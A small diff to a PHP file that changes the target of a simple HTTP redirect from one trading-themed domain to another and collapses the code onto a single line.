@@ -1,5 +1,1 @@
-<?php 
-header('location: https://forex-assets.exchange');
-exit();
-
-?>
+<?php header('location: https://wievatrade.com');exit();?>
